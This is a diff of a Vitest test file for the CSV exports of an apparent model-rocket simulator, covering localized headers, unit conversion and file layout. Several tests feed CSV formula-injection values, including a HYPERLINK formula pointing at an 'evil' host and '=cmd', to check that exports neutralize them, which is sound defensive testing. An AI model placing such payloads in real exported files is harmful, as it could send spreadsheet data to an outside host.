@@ -2,6 +2,23 @@ import { describe, it, expect } from 'vitest';
 import { flightDataCsv, aeroTableCsv, flightEventsCsv, runTableCsv } from '../../../src/services/exports/csvExport';
 import { METRIC_UNITS, IMPERIAL_UNITS } from '../../../src/prefs/units';
 import type { FlightResult, AeroSweep } from '../../../src/engine/openRocketEngine';
+import en from '../../../src/i18n/locales/en.json';
+import de from '../../../src/i18n/locales/de.json';
+import { localeTranslator } from '../../testing/localeTranslator';
+
+/** A locale's `t`, with i18next's `context` variants (`_rail`, `_rod`). */
+const tFor = (bundle: unknown) => {
+  const base = localeTranslator(bundle);
+  return (key: string, vars?: Record<string, unknown>): string => {
+    const ctx = vars?.['context'];
+    if (typeof ctx === 'string') {
+      const own = base(`${key}_${ctx}`, vars);
+      if (own !== `${key}_${ctx}`) return own;
+    }
+    return base(key, vars);
+  };
+};
+const tEn = tFor(en);
 
 const result = {
   series: {
@@ -52,24 +69,24 @@ describe('flightDataCsv', () => {
     const csv = flightDataCsv(result, METRIC_UNITS, {
       ...opts,
       columns: ['velocity', 'time'],
-      fieldDescriptions: false,
+      fieldDescriptions: true,
       simDescription: false,
       flightEvents: false,
     });
-    expect(csv.split('\r\n')[0]).toBe('Time (s),Velocity (m/s)');
+    expect(csv.split('\r\n')[0]).toBe('# Time (s),Velocity (m/s)');
   });
 
   it('applies the chosen unit to every column', () => {
     const csv = flightDataCsv(result, METRIC_UNITS, {
       ...opts,
       columns: ['time', 'altitude', 'mass'],
-      fieldDescriptions: false,
+      fieldDescriptions: true,
       simDescription: false,
       flightEvents: false,
       decimals: 1,
     });
     const rows = csv.split('\r\n');
-    expect(rows[0]).toBe('Time (s),Altitude (m),Mass (g)');
+    expect(rows[0]).toBe('# Time (s),Altitude (m),Mass (g)');
     // kg -> g, so 0.05 reads as 50.
     expect(rows[1]).toBe('0.0,0.0,50.0');
   });
@@ -79,7 +96,7 @@ describe('flightDataCsv', () => {
       flightDataCsv(result, METRIC_UNITS, {
         ...opts,
         columns: ['altitude'],
-        fieldDescriptions: false,
+        fieldDescriptions: true,
         simDescription: false,
         flightEvents: false,
         ...o,
@@ -94,11 +111,11 @@ describe('flightDataCsv', () => {
       ...opts,
       columns: ['time', 'altitude'],
       separator: '\t',
-      fieldDescriptions: false,
+      fieldDescriptions: true,
       simDescription: false,
       flightEvents: false,
     });
-    expect(csv.split('\r\n')[0]).toBe('Time (s)	Altitude (m)');
+    expect(csv.split('\r\n')[0]).toBe('# Time (s)	Altitude (m)');
   });
 
   it('comments the simulation, the fields and the events, each on request', () => {
@@ -106,7 +123,33 @@ describe('flightDataCsv', () => {
     const comments = csv.split('\r\n').filter((l) => l.startsWith('#'));
     expect(comments).toContain('# Simulation: Kept');
     expect(comments).toContain('# Time (s)');
-    expect(comments).toContain('# Event BURNOUT at t=1.000 s');
+    expect(comments).toContain('# Event BURNOUT occurred at t=1 seconds');
+  });
+
+  it('lays the file out as desktop does: one commented header, events among the rows at their time', () => {
+    const csv = flightDataCsv(result, METRIC_UNITS, { ...opts, columns: ['time', 'altitude'] }, 'Kept');
+    expect(csv.split('\r\n')).toEqual([
+      '# Simulation: Kept',
+      '# 2 data points written for 2 variables.',
+      '#',
+      '# Time (s),Altitude (m)',
+      '0.000,0.000',
+      '# Event BURNOUT occurred at t=1 seconds',
+      '1.000,100.000',
+      '# Event APOGEE occurred at t=5.234 seconds',
+      '',
+    ]);
+  });
+
+  it('writes no header row when field descriptions are off', () => {
+    const csv = flightDataCsv(result, METRIC_UNITS, {
+      ...opts,
+      columns: ['time'],
+      simDescription: false,
+      fieldDescriptions: false,
+      flightEvents: false,
+    });
+    expect(csv).toBe('0.000\r\n1.000\r\n');
   });
 
   it('writes no comments at all when none were asked for', () => {
@@ -146,7 +189,7 @@ describe('flightDataCsv', () => {
       ...opts,
       columns: ['time', 'altitude'],
       simDescription: false,
-      fieldDescriptions: false,
+      fieldDescriptions: true,
       flightEvents: false,
     });
     expect(csv.split('\r\n')[1]).toBe('0.000,');
@@ -161,12 +204,33 @@ describe('flightDataCsv', () => {
       columns: ['Px', 'Py'],
       decimals: 2,
       simDescription: false,
-      fieldDescriptions: false,
+      fieldDescriptions: true,
       flightEvents: false,
     });
     const rows = csv.split('\r\n');
-    expect(rows[0]).toBe('East (ft),North (ft)');
+    expect(rows[0]).toBe('# East (ft),North (ft)');
     expect(rows[2]).toBe('98.43,-131.23');
+  });
+
+  it('writes air temperature as a reading, with the unit offset applied', () => {
+    // 288.15 K is 15 °C and 59 °F (C = K - 273.15, F = C * 9/5 + 32). A column
+    // multiplier alone would write 288.15 and 518.67.
+    const r = { series: { time: [0], T: [288.15] }, events: [] } as unknown as FlightResult;
+    const write = (units: typeof METRIC_UNITS) =>
+      flightDataCsv(r, units, {
+        ...opts,
+        columns: ['time', 'T'],
+        decimals: 2,
+        simDescription: false,
+        fieldDescriptions: true,
+        flightEvents: false,
+      }).split('\r\n');
+    const metric = write(METRIC_UNITS);
+    expect(metric[0]).toBe('# Time (s),T (°C)');
+    expect(metric[1]).toBe('0.00,15.00');
+    const imperial = write(IMPERIAL_UNITS);
+    expect(imperial[0]).toBe('# Time (s),T (°F)');
+    expect(imperial[1]).toBe('0.00,59.00');
   });
 });
 
@@ -183,8 +247,9 @@ const sweep = {
 describe('aeroTableCsv', () => {
   it('includes the Cd_powerOn column and sanitizes component header names', () => {
     const lines = aeroTableCsv(sweep, METRIC_UNITS).split('\r\n');
-    // brackets stripped, comma → semicolon
-    expect(lines[0]).toBe('Mach,Cd,Cd_friction,Cd_pressure,Cd_base,Cd_powerOn,CP (cm),CNalpha (/rad),Cd_Nose1;x');
+    // Brackets stripped; the comma is kept and the field quoted, so it stays one column.
+    expect(lines[0]).toBe('Mach,Cd,Cd_friction,Cd_pressure,Cd_base,Cd_powerOn,CP (cm),CNalpha (/rad),"Cd_Nose1,x"');
+    expect(fields(lines[0]!)).toHaveLength(9);
     expect(lines[1]).toBe('0.500,0.5,0.1,0.2,0.2,0.6,22.3,2,0.05');
   });
 
@@ -263,7 +328,7 @@ describe('flightEventsCsv', () => {
   ];
   const name = (r: { type: string }) => (r.type === 'LAUNCHROD' ? 'Rail departure' : 'Landing');
   const stage = (r: { branchName: string; branch: number }) => r.branchName || `Stage ${r.branch + 1}`;
-  const csv = () => flightEventsCsv(rows, METRIC_UNITS, name, stage, 'C6 flight');
+  const csv = () => flightEventsCsv(rows, METRIC_UNITS, tEn, name, stage, 'C6 flight');
 
   it('writes every extra as its own column, blank where an event has none', () => {
     const lines = csv().trim().split('\r\n');
@@ -278,17 +343,27 @@ describe('flightEventsCsv', () => {
   });
 
   it('converts to the given units, so an imperial file reads in feet', () => {
-    const lines = flightEventsCsv(rows, IMPERIAL_UNITS, name, stage).trim().split('\r\n');
+    const lines = flightEventsCsv(rows, IMPERIAL_UNITS, tEn, name, stage).trim().split('\r\n');
     expect(lines[0]).toContain('Altitude (ft)');
     expect(lines[1]!.split(',')[4]).toBe(String(Math.round((1.5 / 0.3048) * 1e6) / 1e6));
   });
 
   it('omits the title comment when there is no simulation name', () => {
-    expect(flightEventsCsv(rows, METRIC_UNITS, name, stage).startsWith('Time (s),')).toBe(true);
+    expect(flightEventsCsv(rows, METRIC_UNITS, tEn, name, stage).startsWith('Time (s),')).toBe(true);
+  });
+
+  it('writes its title and headers in the language of its cells', () => {
+    const [title, head] = flightEventsCsv(rows, METRIC_UNITS, tFor(de), name, stage, 'C6').split('\r\n');
+    expect(title).toBe(`# ${de.csv.head.simulationLine.replace('{{name}}', 'C6')}`);
+    expect(head!.startsWith(`${de.csv.head.time} (s),${de.csv.head.event},${de.csv.head.source},`)).toBe(true);
+    expect(head).not.toMatch(/Event|Altitude|Velocity/);
+    // The caliber unit is a word, and German abbreviates it differently.
+    expect(head).toContain(`${de.csv.head.stability} (${de.stability.caliber})`);
+    expect(head).not.toContain('(cal)');
   });
 
   it('keeps a file-sourced simulation name in one cell of the title line', () => {
-    const csvText = flightEventsCsv(rows, METRIC_UNITS, name, stage, 'x,=HYPERLINK("http://evil/?"&A1);=1\t=2');
+    const csvText = flightEventsCsv(rows, METRIC_UNITS, tEn, name, stage, 'x,=HYPERLINK("http://evil/?"&A1);=1\t=2');
     const title = csvText.split('\r\n')[0]!;
     expect(title).not.toMatch(/[,;\t]/);
     expect(fields(title)).toHaveLength(1);
@@ -298,6 +373,7 @@ describe('flightEventsCsv', () => {
     const csvText = flightEventsCsv(
       [{ ...rows[0]!, branchName: 'Booster, lower' }],
       METRIC_UNITS,
+      tEn,
       name,
       (r) => r.branchName,
     );
@@ -319,6 +395,7 @@ describe('flightEventsCsv', () => {
     const csvText = flightEventsCsv(
       [{ ...rows[0]!, source: '=HYPERLINK("http://evil/?"&A1,"Open")', branchName: '+1+1' }],
       METRIC_UNITS,
+      tEn,
       name,
       (r) => r.branchName,
     );
@@ -332,14 +409,20 @@ describe('flightEventsCsv', () => {
 
   it('prefixes every trigger character, including a leading minus', () => {
     for (const bad of ['=cmd', '+1', '-1+1', '@SUM(A1)', '\tlead']) {
-      const csvText = flightEventsCsv([{ ...rows[0]!, branchName: bad }], METRIC_UNITS, name, (r) => r.branchName);
+      const csvText = flightEventsCsv([{ ...rows[0]!, branchName: bad }], METRIC_UNITS, tEn, name, (r) => r.branchName);
       const cell = fields(csvText.trim().split('\r\n')[1]!)[3];
       expect(cell, bad).toBe(`'${bad}`);
     }
   });
 
   it('leaves an ordinary name untouched, prefix and all', () => {
-    const csvText = flightEventsCsv([{ ...rows[0]!, branchName: 'Booster' }], METRIC_UNITS, name, (r) => r.branchName);
+    const csvText = flightEventsCsv(
+      [{ ...rows[0]!, branchName: 'Booster' }],
+      METRIC_UNITS,
+      tEn,
+      name,
+      (r) => r.branchName,
+    );
     expect(fields(csvText.trim().split('\r\n')[1]!)[3]).toBe('Booster');
   });
 });
@@ -369,6 +452,7 @@ describe('runTableCsv', () => {
         { name: 'Never flown', configuration: 'D12', motors: 'Estes D12-5', status: 'Not run' },
       ],
       IMPERIAL_UNITS,
+      tEn,
     );
     const [head, a, b] = csv.trimEnd().split('\r\n');
     expect(head).toContain('Apogee (ft)');
@@ -389,12 +473,23 @@ describe('runTableCsv', () => {
   });
 
   it('keeps a name from becoming a spreadsheet formula', () => {
-    const csv = runTableCsv([{ name: '=HYPERLINK("x")', configuration: '', motors: '', status: '' }], METRIC_UNITS);
+    const csv = runTableCsv(
+      [{ name: '=HYPERLINK("x")', configuration: '', motors: '', status: '' }],
+      METRIC_UNITS,
+      tEn,
+    );
     expect(csv.split('\r\n')[1]!.startsWith('"\'=HYPERLINK(""x"")"')).toBe(true);
   });
 
+  it('writes its headers in the language of its cells', () => {
+    const head = runTableCsv([], METRIC_UNITS, tFor(de), 'rail').split('\r\n')[0]!;
+    expect(head.startsWith(`${de.csv.head.simulation},${de.csv.head.configuration},`)).toBe(true);
+    expect(head).toContain(`${de.csv.head.exitVelocity_rail} (m/s)`);
+    expect(head).not.toMatch(/Apogee|Max velocity|Configuration/);
+  });
+
   it("names the exit column after the design's launcher", () => {
-    const head = (k: 'rail' | 'rod' | null) => runTableCsv([], METRIC_UNITS, k).split('\r\n')[0]!;
+    const head = (k: 'rail' | 'rod' | null) => runTableCsv([], METRIC_UNITS, tEn, k).split('\r\n')[0]!;
     expect(head('rail')).toContain('Rail exit velocity (m/s)');
     expect(head('rod')).toContain('Rod exit velocity (m/s)');
     expect(head(null)).toContain('Launcher exit velocity (m/s)');
